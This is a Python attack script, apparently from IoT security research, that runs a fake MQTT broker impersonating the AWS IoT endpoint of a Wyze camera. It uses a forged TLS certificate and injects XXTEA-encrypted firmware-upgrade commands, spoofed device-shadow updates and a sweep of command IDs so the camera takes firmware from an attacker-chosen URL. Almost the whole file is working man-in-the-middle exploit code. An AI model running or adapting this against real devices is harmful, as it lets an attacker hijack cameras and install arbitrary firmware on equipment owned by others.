#!/usr/bin/env python3
"""Minimal MQTT 3.1.1 broker that injects cmd 1234 into a Wyze camera.

Enough of the protocol to look like the AWS IoT endpoint the camera expects: CONNECT→CONNACK,
SUBSCRIBE→SUBACK, and a PUBLISH to `hl/devices/<mac>/cmd` once the device subscribes to it. The
camera's own PUBLISHes are logged and ignored. TLS uses a forged eMudhra leaf (mint_emudhra_leaf.py).

  wyze_mitm_broker.py --cert /tmp/iot-chain.pem --key /tmp/iot.key --mac 80482C525905 \
      --url https://s3-us-west-2.amazonaws.com/wuv2/upgrade/HL_CAM4/firmware/4.52.17.30.tar \
      --md5 3753d340855271524cd884b3b72215b1
"""
import argparse
import os
import json
import socket
import ssl
import struct
import threading
import time


def read_packet(sock):
    head = sock.recv(1)
    if not head:
        return None, None
    mult, length, i = 1, 0, 0
    while True:
        b = sock.recv(1)
        if not b:
            return None, None
        length += (b[0] & 0x7F) * mult
        mult *= 128
        i += 1
        if not b[0] & 0x80 or i > 3:
            break
    body = b""
    while len(body) < length:
        chunk = sock.recv(length - len(body))
        if not chunk:
            return None, None
        body += chunk
    return head[0], body


def enc_len(n):
    out = b""
    while True:
        d = n % 128
        n //= 128
        out += bytes([d | (0x80 if n else 0)])
        if not n:
            return out


def packet(kind, body, flags=0):
    return bytes([(kind << 4) | flags]) + enc_len(len(body)) + body



def _xxtea(data, key):
    n = len(data) // 4
    if n < 2:
        return data
    v = list(struct.unpack("<%dI" % n, data[:n * 4]))
    k = list(struct.unpack("<4I", (key + b"\0" * 16)[:16]))
    delta, rounds, total, z = 0x9E3779B9, 6 + 52 // n, 0, v[n - 1]
    for _ in range(rounds):
        total = (total + delta) & 0xFFFFFFFF
        e = (total >> 2) & 3
        for p in range(n):
            y = v[(p + 1) % n]
            mx = (((z >> 5) ^ (y << 2)) + ((y >> 3) ^ (z << 4))) ^ ((total ^ y) + (k[(p & 3) ^ e] ^ z))
            v[p] = (v[p] + mx) & 0xFFFFFFFF
            z = v[p]
    return struct.pack("<%dI" % n, *v)


def cmd_body(args, model=None):
    """The cloud's own command shape, XXTEA-encrypted with the ENR string."""
    import os, time
    ver = args.url.rsplit("/", 1)[-1].split(".tar")[0]
    par = json.loads(args.params) if getattr(args, "params", "") else {
        "model": model or args.model, "url": args.url, "firmware_ver": ver, "md5": args.md5}
    body = json.dumps({"Action": getattr(args, "action", "upgrade"),
                       "Params": par,
                       "Guid": os.urandom(8).hex(), "Ts": int(time.time() * 1000)},
                      separators=(",", ":")).encode()
    if getattr(args, "rawhex", ""):
        return bytes.fromhex(args.rawhex)
    key = (args.enr or "").encode()
    if not key:
        return body
    return _xxtea(body + b"\0" * (-len(body) % 4), key)

_PID = [0]


def next_pid():
    _PID[0] = (_PID[0] % 65535) + 1
    return _PID[0]


def handle(conn, addr, args):
    print(f"[{addr}] connect", flush=True)
    kind, body = read_packet(conn)
    if kind is None or kind >> 4 != 1:
        return
    cid = body[12:12 + struct.unpack(">H", body[10:12])[0]].decode(errors="replace")
    print(f"[{addr}] CONNECT flags={kind:02x} client_id={cid!r}", flush=True)
    conn.sendall(packet(2, b"\x00\x00"))  # CONNACK, session present 0, accepted

    while True:
        kind, body = read_packet(conn)
        if kind is None:
            print(f"[{addr}] closed", flush=True)
            return
        t = kind >> 4
        if t == 8:  # SUBSCRIBE
            pid = body[:2]
            topics, i = [], 2
            while i < len(body):
                ln = struct.unpack(">H", body[i:i + 2])[0]
                topics.append(body[i + 2:i + 2 + ln].decode(errors="replace"))
                i += 2 + ln + 1
            print(f"[{addr}] SUBSCRIBE {topics}", flush=True)
            conn.sendall(packet(9, pid + b"".join(b"\x01" for _ in topics)))  # SUBACK qos1
            cmd_topics = [tp for tp in topics if tp.startswith("hl/devices/") and tp.endswith("/cmd")]
            if cmd_topics:
                if addr[0] != "127.0.0.1":
                    args.mac = cmd_topics[0].split("/")[2]
                args.sub_mac = args.mac.upper()
                payload = cmd_body(args)
                topic = f"hl/devices/{args.mac}/cmd".encode()
                body_out = struct.pack(">H", len(topic)) + topic + struct.pack(">H", next_pid()) + payload

                def delta():
                    st = {"state": {"desired": {"url": args.url, "md5": args.md5,
                                                "model": args.model, "sub_mac": args.sub_mac}},
                          "version": 999}
                    tp = f"$aws/things/{args.mac}/shadow/name/wyze-service/update/delta".encode()
                    body = struct.pack(">H", len(tp)) + tp + json.dumps(st).encode()
                    try:
                        conn.sendall(packet(3, body, flags=0x00))
                        print(f"[{addr}] PUBLISH delta", flush=True)
                    except OSError:
                        pass

                threading.Thread(target=delta, daemon=True).start()

                def shape(c, a):
                    inner = {"url": a.url, "md5": a.md5, "model": a.model, "sub_mac": a.sub_mac}
                    base = {"cmd": c, "sub_mac": a.sub_mac, **inner}
                    modes = ["plain", "data_obj", "data_str", "ver", "ctype", "cmdstr"]
                    k = modes[(c - 1231) % len(modes)] if a.shapes else (a.wrap or "plain")
                    k = {"str": "data_str", "obj": "data_obj"}.get(k, k)
                    if k == "data_obj":
                        base["data"] = inner
                    elif k == "data_str":
                        base["data"] = json.dumps(inner)
                    elif k == "ver":
                        base["ver"] = "1"; base["encrypt_type"] = 1; base["data"] = inner
                    elif k == "ctype":
                        base["data"] = inner; base["encrypt_type"] = 1
                    elif k == "cmdstr":
                        base["cmd"] = str(c); base["data"] = inner
                    return base

                def blaster():
                    # let the device apply and report the delta before the trigger lands
                    time.sleep(args.delay)
                    if args.cmd:
                        cmds = [args.cmd]
                    else:
                        cmds = list(range(1231, 1243))  # sweep: the table may shift between builds
                    for i in range(args.repeat):
                        try:
                            c = cmds[i % len(cmds)]
                            if args.shapes:
                                args.model = ["HL_CFL", "HL_CAM4"][(i // len(cmds)) % 2]
                            pl = cmd_body(args)
                            tb = topic.encode() if isinstance(topic, str) else topic
                            bo = struct.pack(">H", len(tb)) + tb + struct.pack(">H", next_pid()) + pl
                            conn.sendall(packet(3, bo, flags=0x02))  # QoS1
                            print(f"[{addr}] PUBLISH cmd {c} -> {pl[:40]!r}", flush=True)
                        except OSError:
                            return
                        time.sleep(args.interval)

                threading.Thread(target=blaster, daemon=True).start()
        elif t == 12:  # PINGREQ
            conn.sendall(packet(13, b""))
        elif t == 3:  # PUBLISH from device
            qos = (kind >> 1) & 3
            ln = struct.unpack(">H", body[:2])[0]
            topic = body[2:2 + ln].decode(errors="replace")
            print(f"[{addr}] <- PUBLISH {topic} {body[2+ln:2+ln+120]!r}", flush=True)
            if qos == 1:
                pid = body[2 + ln:4 + ln]
                conn.sendall(packet(4, pid))  # PUBACK
            # A real broker answers a shadow "get" with get/accepted carrying the document.
            # Without it the device has no shadow state to diff and never applies the delta.
            if topic.endswith("/shadow/name/wyze-service/get") or \
                    topic.endswith("/shadow/name/wyze-secure/get"):
                acc = topic + "/accepted"
                doc = {"state": {"desired": {"url": args.url, "md5": args.md5,
                                             "model": args.model, "sub_mac": args.sub_mac.upper()},
                                 "reported": {}}, "version": 1, "timestamp": 1}
                pay = json.dumps(doc).encode()
                out = struct.pack(">H", len(acc)) + acc.encode() + pay
                try:
                    conn.sendall(packet(3, out, flags=0x00))
                    print(f"[{addr}] PUBLISH get/accepted {len(pay)}B", flush=True)
                except OSError:
                    pass
        elif t == 4:
            print(f"[{addr}] PUBACK", flush=True)
        elif t == 10:
            conn.sendall(packet(11, body[:2]))
        elif t == 14:
            conn.sendall(packet(14, b""))
            print(f"[{addr}] DISCONNECT", flush=True)
            return


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--cert", required=True)
    ap.add_argument("--key", required=True)
    ap.add_argument("--mac", required=True)
    ap.add_argument("--sub-mac", required=True)
    ap.add_argument("--model", default="HL_CFL")
    ap.add_argument("--url", required=True)
    ap.add_argument("--md5", required=True)
    ap.add_argument("--port", type=int, default=8883)
    ap.add_argument("--repeat", type=int, default=12)
    ap.add_argument("--interval", type=float, default=5.0)
    ap.add_argument("--delay", type=float, default=15.0)
    ap.add_argument("--cmd", type=int, default=0, help="0 = sweep 1231..1242")
    ap.add_argument("--shapes", action="store_true")
    ap.add_argument("--wrap", nargs="?", const="obj", help="also nest the descriptor under data")
    ap.add_argument("--enr", default=os.environ.get("OTA_ENR", ""), help="device ENR string (XXTEA key)")
    ap.add_argument("--rawhex", default="", help="publish this exact ciphertext instead of building one")
    ap.add_argument("--action", default="upgrade", help="Action name")
    ap.add_argument("--params", default="", help="raw JSON Params object")
    a = ap.parse_args()

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(a.cert, a.key)
    ctx.set_alpn_protocols(["x-amzn-mqtt-ca"])
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", a.port))
    srv.listen(8)
    print(f"broker on :{a.port}", flush=True)
    while True:
        raw, addr = srv.accept()
        try:
            conn = ctx.wrap_socket(raw, server_side=True)
        except Exception as exc:
            print(f"[{addr}] TLS failed {exc}", flush=True)
            continue
        threading.Thread(target=handle, args=(conn, addr, a), daemon=True).start()


if __name__ == "__main__":
    main()
